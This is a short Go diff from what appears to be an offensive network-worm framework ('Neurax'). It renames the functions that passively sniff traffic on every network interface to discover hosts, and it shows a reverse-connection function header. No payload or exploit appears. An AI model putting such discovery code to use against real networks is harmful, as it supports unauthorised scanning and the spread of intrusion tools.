@@ -329,7 +329,7 @@ func NeuraxReverse(proto string) {
 	}
 }
 
-func neurax_ScanPassive_single_iface(c chan string, iface string) {
+func neurax_scan_passive_single_iface(c chan string, iface string) {
 	var snapshot_len int32 = 1024
 	timeout := 5000000000 * time.Second
 	handler, err := pcap.OpenLive(iface, snapshot_len, false, timeout)
@@ -353,7 +353,7 @@ func neurax_ScanPassive_single_iface(c chan string, iface string) {
 	}
 }
 
-func neurax_ScanPassive(c chan string) {
+func neurax_scan_passive(c chan string) {
 	current_iface, _ := coldfire.Iface()
 	ifaces_to_use := []string{current_iface}
 	device_names := []string{}
@@ -366,7 +366,7 @@ func neurax_ScanPassive(c chan string) {
 		ifaces_to_use = append(ifaces_to_use, device_names...)
 	}
 	for _, device := range ifaces_to_use {
-		go neurax_ScanPassive_single_iface(c, device)
+		go neurax_scan_passive_single_iface(c, device)
 	}
 }
 
@@ -393,7 +393,7 @@ func neurax_scan_active(c chan string) {
 
 func neurax_scan_core(c chan string) {
 	if NeuraxConfig.ScanPassive {
-		neurax_ScanPassive(c)
+		neurax_scan_passive(c)
 	} else {
 		neurax_scan_active(c)
 	}
